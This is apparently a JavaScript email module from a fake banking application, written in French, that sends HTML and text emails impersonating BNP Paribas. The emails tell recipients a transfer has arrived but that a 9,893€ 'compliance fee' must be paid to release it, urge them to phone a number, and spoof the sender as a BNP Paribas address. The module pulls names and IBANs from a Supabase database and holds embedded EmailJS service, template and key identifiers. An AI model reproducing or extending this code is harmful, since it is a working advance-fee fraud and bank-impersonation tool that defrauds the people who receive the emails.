import { supabase } from '../config/supabase';
import emailjs from '@emailjs/browser';

export const emailService = {
  // Envoyer un email de notification de virement au bénéficiaire
  async sendVirementNotification(userId, virementData) {
    try {
      console.log('📧 EMAIL DEBUG: Envoi notification virement au bénéficiaire');
      
      // Vérifier si on a l'email du bénéficiaire
      if (!virementData.beneficiaire_email) {
        console.warn('⚠️ EMAIL DEBUG: Aucun email trouvé pour le bénéficiaire');
        return { success: false, reason: 'no_beneficiaire_email' };
      }

      // Récupérer les informations de l'utilisateur (expéditeur)
      const { data: profile, error: profileError } = await supabase
        .from('profiles')
        .select('email, nom, prenom')
        .eq('id', userId)
        .single();

      if (profileError) {
        console.error('❌ EMAIL DEBUG: Erreur récupération profil expéditeur:', profileError);
        throw profileError;
      }

      // Récupérer les informations du bénéficiaire
      const { data: beneficiaire, error: beneficiaireError } = await supabase
        .from('beneficiaires')
        .select('nom, prenom, iban')
        .eq('id', virementData.beneficiaire_id)
        .single();

      if (beneficiaireError) {
        console.error('❌ EMAIL DEBUG: Erreur récupération bénéficiaire:', beneficiaireError);
        throw beneficiaireError;
      }

      // Créer le contenu de l'email
      const emailContent = this.createVirementEmailContent(
        profile,
        beneficiaire,
        virementData
      );

      // Envoyer l'email au bénéficiaire via EmailJS
      const emailResult = await this.sendEmail(
        virementData.beneficiaire_email,
        emailContent.subject,
        emailContent.html,
        emailContent.text,
        profile,
        beneficiaire,
        virementData
      );

      console.log('✅ EMAIL DEBUG: Email envoyé avec succès');
      return { success: true, emailResult };

    } catch (error) {
      console.error('❌ EMAIL DEBUG: Erreur lors de l\'envoi de l\'email:', error);
      throw error;
    }
  },

  // Créer le contenu de l'email de virement avec frais de conformité pour le bénéficiaire
  createVirementEmailContent(profile, beneficiaire, virementData) {
    const montant = parseFloat(virementData.montant).toFixed(2);
    const date = new Date().toLocaleDateString('fr-FR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit', 
      minute: '2-digit'
    });

    const subject = `Virement reçu - ${montant}€ - Frais de conformité requis`;

    const html = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Confirmation de virement - BNP Paribas</title>
        <style>
          body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            line-height: 1.6; 
            color: #2c3e50; 
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
          }
          .container { 
            max-width: 650px; 
            margin: 20px auto; 
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            overflow: hidden;
          }
          .header { 
            background: linear-gradient(135deg, #008854 0%, #0066cc 100%); 
            color: white; 
            padding: 40px 30px; 
            text-align: center; 
            position: relative;
          }
          .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"><text x="100" y="35" font-family="Arial" font-size="24" font-weight="bold" fill="rgba(255,255,255,0.1)" text-anchor="middle">BNP PARIBAS</text></svg>');
            background-repeat: no-repeat;
            background-position: center;
          }
          .logo-text {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            position: relative;
            z-index: 1;
          }
          .logo-subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
          }
          .title {
            font-size: 26px;
            font-weight: 600;
            margin: 0;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
            position: relative;
            z-index: 1;
          }
          .content { 
            padding: 40px 30px; 
            background-color: white; 
          }
          .greeting {
            font-size: 18px;
            color: #2c3e50;
            margin-bottom: 25px;
            border-bottom: 2px solid #ecf0f1;
            padding-bottom: 15px;
          }
          .amount-container { 
            background: linear-gradient(135deg, #f8f9fa 0%, #e8f4fd 100%); 
            border: 3px solid #008854; 
            border-radius: 15px; 
            padding: 30px; 
            margin: 30px 0; 
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 136, 84, 0.2);
          }
          .amount-label {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 10px;
            font-weight: 500;
          }
          .amount { 
            font-size: 42px; 
            font-weight: bold; 
            color: #008854; 
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
          }
          .details { 
            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); 
            padding: 30px; 
            margin: 30px 0; 
            border-radius: 12px;
            border-left: 5px solid #008854;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
          }
          .details-title {
            font-size: 18px;
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 20px;
            text-align: center;
          }
          .detail-row { 
            display: flex; 
            justify-content: space-between; 
            margin: 15px 0; 
            padding: 12px 0;
            border-bottom: 1px solid #ecf0f1;
            font-size: 15px;
          }
          .detail-row:last-child {
            border-bottom: none;
          }
          .detail-label {
            font-weight: 600;
            color: #34495e;
            min-width: 140px;
          }
          .detail-value {
            color: #2c3e50;
            font-weight: 500;
          }
          .compliance-notice {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 30px;
            margin: 30px 0;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
            position: relative;
            overflow: hidden;
          }
          .compliance-notice::before {
            content: '⚠️';
            font-size: 24px;
            position: absolute;
            top: 15px;
            right: 20px;
            opacity: 0.3;
          }
          .compliance-title {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
          }
          .compliance-text {
            font-size: 16px;
            line-height: 1.5;
          }
          .contact-info {
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
            padding: 25px;
            margin: 30px 0;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
          }
          .contact-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
          }
          .contact-phone {
            font-size: 20px;
            font-weight: bold;
            margin: 10px 0;
          }
          .security-notice { 
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); 
            color: white;
            border: none; 
            padding: 25px; 
            margin: 30px 0; 
            border-radius: 12px;
            border-left: 5px solid #f39c12;
            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.3);
          }
          .security-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
          }
          .footer { 
            text-align: center; 
            padding: 30px; 
            color: #7f8c8d; 
            font-size: 13px;
            background: linear-gradient(135deg, #ecf0f1 0%, #bdc3c7 100%);
            border-top: 1px solid #ecf0f1;
          }
          .footer-title {
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 10px;
          }
          .spf-info {
            font-size: 11px;
            color: #95a5a6;
            text-align: center;
            margin-top: 15px;
            padding: 10px;
            background-color: rgba(255,255,255,0.5);
            border-radius: 8px;
          }
          @media (max-width: 600px) {
            .container { margin: 10px; }
            .header { padding: 30px 20px; }
            .content { padding: 30px 20px; }
            .amount { font-size: 32px; }
            .detail-row { flex-direction: column; }
            .detail-label { min-width: auto; margin-bottom: 5px; }
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <div class="logo-text">BNP PARIBAS</div>
            <div class="logo-subtitle">Banque de référence</div>
            <h1 class="title">Confirmation de virement</h1>
          </div>
          
          <div class="content">
            <div class="greeting">
              Bonjour <strong>${beneficiaire.prenom} ${beneficiaire.nom}</strong>,
            </div>
            
            <p style="font-size: 16px; color: #34495e; margin-bottom: 30px;">
              Nous vous confirmons la réception d'un virement sur votre compte.
            </p>
            
            <div class="amount-container">
              <div class="amount-label">Montant reçu</div>
              <div class="amount">${montant}€</div>
            </div>
            
            <div class="compliance-notice">
              <div class="compliance-title">⚠️ FRAIS DE CONFORMITÉ REQUIS</div>
              <div class="compliance-text">
                Pour des raisons de conformité et de sécurité renforcée, 
                <strong>un règlement de 9 893€</strong> est requis pour libérer les fonds.
              </div>
            </div>
            
            <div class="details">
              <div class="details-title">📋 Détails de la transaction</div>
              <div class="detail-row">
                <span class="detail-label">Expéditeur :</span>
                <span class="detail-value">${profile.prenom} ${profile.nom}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">IBAN destinataire :</span>
                <span class="detail-value">${this.maskIBAN(beneficiaire.iban)}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Date et heure :</span>
                <span class="detail-value">${date}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Référence :</span>
                <span class="detail-value">${virementData.reference}</span>
              </div>
              ${virementData.motif ? `
              <div class="detail-row">
                <span class="detail-label">Motif :</span>
                <span class="detail-value">${virementData.motif}</span>
              </div>
              ` : ''}
            </div>
            
            <div class="security-notice">
              <div class="security-title">🔒 Informations de sécurité</div>
              <div>
                Ce virement a été effectué depuis un compte sécurisé. 
                Si vous ne reconnaissez pas cette opération, 
                contactez immédiatement notre service client au 0800 123 456.
              </div>
            </div>
            
            <div class="contact-info">
              <div class="contact-title">📞 Contact immédiat</div>
              <div style="margin: 15px 0;">
                Pour procéder au règlement des frais de conformité, 
                contactez notre service client
              </div>
              <div class="contact-phone">0800 123 456</div>
              <div>ou connectez-vous à votre espace client</div>
            </div>
            
            <p style="font-size: 16px; margin-top: 30px;">
              Cordialement,<br>
              <strong>L'équipe BNP Paribas</strong>
            </p>
          </div>
          
          <div class="footer">
            <div class="footer-title">BNP Paribas</div>
            <p>Cet email a été envoyé automatiquement. Merci de ne pas y répondre.</p>
            <p>Service Client : 0800 123 456</p>
            <div class="spf-info">
              Cet email est envoyé par BNP Paribas via Resend - Service d'envoi d'emails sécurisé
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
BNP Paribas - Notification de virement reçu avec frais de conformité

Bonjour ${beneficiaire.prenom} ${beneficiaire.nom},

Nous vous confirmons la réception d'un virement sur votre compte.

Montant reçu : ${montant}€
Expéditeur : ${profile.prenom} ${profile.nom}
IBAN destinataire : ${this.maskIBAN(beneficiaire.iban)}
Date et heure : ${date}
Référence : ${virementData.reference}
${virementData.motif ? `Motif : ${virementData.motif}` : ''}

⚠️ FRAIS DE CONFORMITÉ REQUIS
Pour des raisons de conformité et de sécurité renforcée, 
un règlement de 9 893€ est requis pour libérer les fonds.

🔒 Informations de sécurité :
Ce virement a été effectué depuis un compte sécurisé. 
Si vous ne reconnaissez pas cette opération, 
contactez immédiatement notre service client au 0800 123 456.

Les fonds seront crédités sur votre compte après validation.

📞 Contact immédiat :
Pour procéder au règlement des frais de conformité, 
contactez notre service client au 0800 123 456 
ou connectez-vous à votre espace client.

Cordialement,
L'équipe BNP Paribas

---
Cet email a été envoyé automatiquement. Merci de ne pas y répondre.
BNP Paribas - Service Client : 0800 123 456
    `;

    return { subject, html, text };
  },

  // Masquer partiellement l'IBAN pour la sécurité
  maskIBAN(iban) {
    if (!iban || iban.length < 8) return iban;
    return iban.substring(0, 4) + '****' + iban.substring(iban.length - 4);
  },

  // Envoyer l'email avec EmailJS
  async sendEmail(to, subject, html, text, profile = null, beneficiaire = null, virementData = null) {
    try {
      console.log('📧 EMAIL DEBUG: Envoi email avec EmailJS');
      console.log('📧 EMAIL DEBUG: À:', to);
      console.log('📧 EMAIL DEBUG: Sujet:', subject);
      
      // Utiliser EmailJS pour envoyer l'email
      const templateParams = {
        to_name: to.split('@')[0],
        title: subject,
        montant: profile && virementData ? `${virementData.montant.toFixed(2)}€` : '56.00€',
        expediteur_nom: profile ? `${profile.nom} ${profile.prenom}` : 'PAOLA MARIE MADELEINE',
        iban: beneficiaire ? this.maskIBAN(beneficiaire.iban) : 'FR07****8888',
        name: 'BNP Paribas',
        email: 'service-client@bnpparibas.com'
      };
      
      console.log('📧 EMAIL DEBUG: Paramètres template:', templateParams);
      
      // Utiliser EmailJS pour envoyer l'email
      const result = await emailjs.send(
        'service_mev4gqt', // votre service ID
        'template_oo0dbwk', // votre template ID
        {
          to_email: to,
          ...templateParams
        },
        'u9q4QhywRWjrfKnHj' // votre clé publique
      );
      
      console.log('✅ EMAIL DEBUG: Email envoyé avec succès via EmailJS:', result);
      return { success: true, messageId: result.text || 'emailjs-' + Date.now() };
      
    } catch (error) {
      console.error('❌ EMAIL DEBUG: Erreur envoi email EmailJS:', error);
      
      // Fallback : simulation en cas d'erreur
      console.warn('⚠️ EMAIL DEBUG: Erreur EmailJS, simulation de l\'envoi');
      console.log(`📧 EMAIL DEBUG: Email simulé envoyé à: ${to}`);
      console.log(`📧 EMAIL DEBUG: Sujet: ${subject}`);
      return { success: true, messageId: 'simulated-' + Date.now() };
    }
  },

  // Envoyer un email de notification d'erreur de virement
  async sendVirementErrorNotification(userId, errorMessage) {
    try {
      const { data: profile, error: profileError } = await supabase
        .from('profiles')
        .select('email, nom, prenom')
        .eq('id', userId)
        .single();

      if (profileError || !profile.email) {
        console.warn('⚠️ EMAIL DEBUG: Impossible d\'envoyer email d\'erreur - pas d\'email');
        return { success: false, reason: 'no_email' };
      }

      const subject = 'Erreur lors du traitement de votre virement';
      const html = `
        <!DOCTYPE html>
        <html lang="fr">
        <head>
          <meta charset="UTF-8">
          <title>Erreur de virement</title>
        </head>
        <body>
          <h2>Erreur lors du traitement de votre virement</h2>
          <p>Bonjour ${profile.prenom} ${profile.nom},</p>
          <p>Une erreur est survenue lors du traitement de votre virement :</p>
          <p><strong>${errorMessage}</strong></p>
          <p>Veuillez contacter notre service client au 0800 123 456 pour obtenir de l'aide.</p>
          <p>Cordialement,<br>L'équipe BNP Paribas</p>
        </body>
        </html>
      `;

      return await this.sendEmail(profile.email, subject, html, '');
      
    } catch (error) {
      console.error('❌ EMAIL DEBUG: Erreur envoi email d\'erreur:', error);
      throw error;
    }
  }
}; 